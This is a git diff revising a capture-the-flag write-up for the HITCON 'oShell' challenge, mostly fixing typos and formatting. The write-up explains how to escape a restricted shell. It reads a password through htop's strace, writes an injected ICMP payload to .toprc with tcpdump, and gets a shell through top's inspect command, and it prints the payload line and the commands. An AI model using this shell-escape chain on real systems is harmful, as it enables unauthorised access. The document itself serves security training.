@@ -10,23 +10,25 @@ _Category: 🍊_
 > Author: Orange
 
 ## Short Solution
-
 Connecting to the server gives users a restricted shell. This shell can execute `htop` and `enable`. By using `htop` to run `strace` on the `enable` process, it is possible to see the secret enable password, granting access to more commands.
-The elevanted command shell enables the extra command `tcpdump`. This can be used to write packet contents to an arbitrary place, in this case, the `top` RC file:
+
+The elevated command shell enables the extra command `tcpdump`. This can be used to write packet contents to an arbitrary place, in this case, the `top` RC file:
 ```sh
 tcpdump -w /home/oShell/.toprc -s 500
 ```
-From the server, you can run a `ping` to a server you control, and modify the `payload` to include a valid `.toprc` command execution payload:
+
+From the server, you can run a `ping` to a server you control, and modify the `payload` to include a valid `.toprc` command execution payload (tab characters are important):
 ```sh
 pipe	x	sh 1>&0
 ```
-Once this contents is written to the `.toprc` file, we can run `top` and press `Y`, `x`, and `return` to run an interactive shell.
+
+Once this contents is written to the `.toprc` file, we can run `top` and press <kbd>shift</kbd> + <kbd>y</kbd>, <kbd>x</kbd>, and <kbd>return</kbd> to run an interactive shell.
+
 Lastly, we can run `/readflag` to output the flag.
 
 ## Long Solution
-
 ### Initial Recon
-When we first connect to the server, we need to specify a team-token which grants us access to a segregated container, which will come in handy later.
+When we first connect to the server, we need to specify a "team-token", which grants us access to a segregated container. This will come in handy later.
 ```sh
 $ ssh oshell@54.150.148.61
 oshell@54.150.148.61's password:
@@ -61,19 +63,18 @@ Available commands:
   enable
 ```
 
-We can also see that most of these binaries are just busybox:
+We can also see that most of these binaries are just BusyBox:
 ```sh
 oshell~$ ping --help
 BusyBox v1.27.2 (2018-06-06 09:08:44 UTC) multi-call binary.
 [...]
 ```
 
-At this stage, we can rely on the wonderfully useful [https://gtfobins.github.io/](GTFOBins), which helps us figure out which of these commands can be used for breaking out of the restricted shell.
+At this stage, we can rely on the wonderfully useful [GTFOBins](https://gtfobins.github.io/), which helps us figure out which of these commands can be used for breaking out of the restricted shell.
 
-The container will stop running after 300 seconds, at which point you need to reconnect to the server, at which point you are given a new container.
+The container will stop running after 300 seconds, at which point you need to reconnect to the server. You will be given a new container.
 
 ### Elevated Shell
-
 With the binaries we have access to, there is no way to break out of the restricted shell, unless we were able to write a file to the system, which we cannot do. Instead, we can focus on elevating our shell using the `enable` command. This command asks for a password:
 ```sh
 oshell~$ enable
@@ -89,8 +90,9 @@ We can use the `strace` functionality of `htop` to analyze the process and deter
     6 oShell     20   0 34516  5492  2040 S  0.0  0.0  0:00.35 python /oShell.py
 ```
 
-This tells us that the `enable` command is part of the `/oShell.py` script, rather than an external binary.
-Now we know what process it is, we can run `strace` using `htop` in one window, while running `enable` in the other. To run `strace`, we just need to press `s` on the process when shown in `htop`.
+This tells us that the `enable` command is part of the `/oShell.py` Python script, rather than an external binary.
+
+Now we know what process it is, we can run `strace` using `htop` in one window, while running `enable` in the other. To run `strace`, we just need to press <kbd>s</kbd> on the process when shown in `htop`:
 ```
 {st_mode=S_IFCHR|0666, st_rdev=makedev(5, 0), ...}) = 0
 ioctl(3, TIOCGWINSZ, {ws_row=0, ws_col=0, ws_xpixel=0, ws_ypixel=0}) = 0
@@ -115,8 +117,7 @@ select(0, NULL, NULL, NULL, {tv_sec=1, tv_usec=0}) = 0 (Timeout)
 writev(1, [{iov_base="Wrong password :(", iov_len=17}, {iov_base="\n", iov_len=1
 ```
 
-The relevant lines from this are that it opens `/enable.secret`, then lets us see the contents of the file. In this case, the enable password is shown as `this-is-secret-7ce3ff0e2c8fd2a7`.
-This will change every time the container restarts, but is relatively quick to find manually each time.
+The relevant lines from this show us that it opens `/enable.secret`, then lets us see the contents of the file. In this case, the enable password is shown as `this-is-secret-7ce3ff0e2c8fd2a7`. This will change every time the container restarts, but is relatively quick to find manually each time.
 
 Now we can execute the `enable` command and get an elevated shell:
 ```sh
@@ -126,9 +127,8 @@ Password:
 ```
 
 ### Break Out Part 1 - Journey to File Write
-
 Now we have our elevated shell, we can see we get some extra commands available to us:
-```
+```sh
 (enabled) oshell~# help
 Available commands:
   help
@@ -147,20 +147,20 @@ Available commands:
   enable
 ```
 
-The most interesting of these is `tcpdump`. This binary allows us to write a pcap file to an arbitrary location on disk, using the `-w` flag. Unfortunately, the contents of this file is tricky to control, as it includes a pcap header, and then the contents of the packets `tcpdump` captures. Fortunately, if we can coax the server into recieving or sending a packet of our choosing, we may be able to control at least a portion of the contents of the file.
+The most interesting of these is `tcpdump`. This binary allows us to write a pcap file to an arbitrary location on disk, using the `-w` flag. Unfortunately, the contents of this file is tricky to control, as it includes a pcap header, and then the contents of the packets `tcpdump` captures. Fortunately, if we can coax the server into receiving or sending a packet of our choosing, we may be able to control at least a portion of the contents of the file.
 
-One of the simpliest ways to cause a packet to be recieved by `tcpdump` is the `ping` command, which on most systems contains a pattern (`-p`) that allows for 16 bytes of user controlled content. On the server, the version of `ping` in use comes from `busybox`, which only allows a single byte packet length:
+One of the simpliest ways to cause a packet to be recieved by `tcpdump` is the `ping` command. On most systems, this contains a pattern (`-p`) that allows for 16 bytes of user controlled content. On the server, the version of `ping` in use comes from `busybox`, which only allows a single byte packet length:
 ```sh
 $ ping --help
 BusyBox v1.27.2 (2018-06-06 09:08:44 UTC) multi-call binary.
 ```
 
-We got stuck here for a while thinking about ways to get a packet onto the system, with thouhts including:
+We got stuck here for a while thinking about ways to get a packet onto the system. Our thoughts included:
 * Some kind of SSH tunneling weirdness
 * Traceroute responses with payloads
 * DNS tricks to send back a response payload
 
-Eventually we realise that while the system itself doesn't allow us to send it incoming packets, due to it being a container without a dedicated IP, it does recieve `ping` packets from the internet, which gives us a chance to specify a payload in a response instead. To help us test this we used a script one of our team members had prepared earlier, called [https://github.com/fincham/nfqueue-break-tls-handshake/blob/master/tls_hello_modify.py](TLSFuc^WTLS Hello Modify).
+Eventually we realised that, while the system itself doesn't allow us to send it incoming packets due to it being a container without a dedicated IP, it does recieve `ping` packets from the internet. This gives us a chance to specify a payload in a response instead. To help us test this we used a script one of our team members had prepared earlier, called [https://github.com/fincham/nfqueue-break-tls-handshake/blob/master/tls_hello_modify.py](TLSFuc^WTLS Hello Modify).
 
 We modified this script to inject an arbitrary payload into an ICMP response prepared by the kernel with the following lines:
 ```py
@@ -172,12 +172,11 @@ Initially we tried just replacing the entire payload, but this resulted in the p
 
 Putting this all together, we are able to run our `tcpdump` command and write our payload to a path we specify. Now we just need a payload and path for it.
 
-### Break Out Part 2 - Shell city
-
+### Break Out Part 2 - Shell City
 Now we can concerntrate on getting a shell. One option is to use the `post-rotate` command feature in `tcpdump`, but we investigated this and found an alternative that worked a little better: `top`.
 
 The `top` command will read out its configuration from a `.toprc`. This allows us to specify arbitrary commands, through the "Inspect" function. This is discussed in [https://gtfobins.github.io/gtfobins/top/](top GTFOBins) page.
-To begin, we need the path to the `.toprc` file, which we can get by launching `top` and pressing `w`:
+To begin, we need the path to the `.toprc` file, which we can get by launching `top` and pressing <kbd>w</kbd>:
 ```
  Wrote configuration to '/home/oShell//.toprc'
 ```
@@ -189,13 +188,14 @@ pipe	x	sh 1>&0
 
 ```
 
-This will simply execute a shell after we choose the `x` inspection option in `top`. It's important to note that the tab characters are required and cannot be spaces, and the newlines are also required so that our payload doesn't have extra bytes around it.
+This will simply execute a shell after we choose the `x` inspection option in `top`. It's important to note:
+* The tab characters before and after `x` are required and cannot be spaces.
+* The newlines before and after the payload are also required so that it doesn't have extra bytes around it.
 
-## Break Out Part 3 - All together now
+### Break Out Part 3 - All together now
+Putting this together, we can run our ICMP modification script on a server we control. We can run `tcpdump -w /home/oShell/.toprc -s 500 icmp` to capture ICMP packets and write them to our `.toprc` file. Lastly, we can run `ping [our-server-ip] -c 1` to send a packet.
 
-Putting this together, we can run our icmp modification script on a server we control. We can run `tcpdump -w /home/oShell/.toprc -s 500 icmp` to capture ICMP packets and write them to our `.toprc` file. Lastly, we can run `ping [our-server-ip] -c 1` to send a packet.
-
-This writes a strange, but still valid, file that `top` can read. Now we open `top`, press `Y` to inspect a process, `return` to select the default PID, then select `x` (the name of the command we used in our payload), and press `return` a final time. We now have an interactive shell!
+This writes a strange, but still valid, file that `top` can read. Now we open `top`, press <kbd>shift</kbd> + <kbd>y</kbd> to inspect a process, <kbd>return</kbd> to select the default PID, then select <kbd>x</kbd> (the name of the command we used in our payload), and press <kbd>return</kbd> a final time. We now have an interactive shell!
 
 The formatting isn't great, but we can type `ls` to see the directory output in `/`:
 ```sh
@@ -232,7 +232,3 @@ From here, we can see a SUID `/readflag` which we can execute. This gives us the
 / $ ./readflag
 HITCON{A! AAAAAAAAAAAA! SHAR~K!!!}
 ```
-
-
-
-
